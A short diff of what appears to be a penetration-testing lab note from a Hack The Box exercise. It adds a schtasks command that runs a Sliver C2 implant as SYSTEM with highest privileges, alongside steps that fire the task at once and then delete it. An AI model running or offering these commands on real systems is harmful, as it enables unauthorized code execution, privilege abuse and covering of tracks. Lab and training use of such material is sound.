@@ -6,6 +6,8 @@ Generate a schtask that will run once (to launch a sliver), remove it after you 
 
 ```
 schtasks /create /tn "OneShotTask" /tr "C:\Users\htb-student\Desktop\sliver.exe" /sc ONCE /st 23:59 /rl HIGHEST /f
+# if you have admin and want system
+schtasks /create /tn "OneShotTask" /tr "C:\Users\htb-student\Desktop\sliver.exe" /sc ONCE /st 20:53 /ru SYSTEM /rl HIGHEST /f
 # fire it immediately (dont wait for the time)
 schtasks /run /tn "OneShotTask"
 # clean up the task 
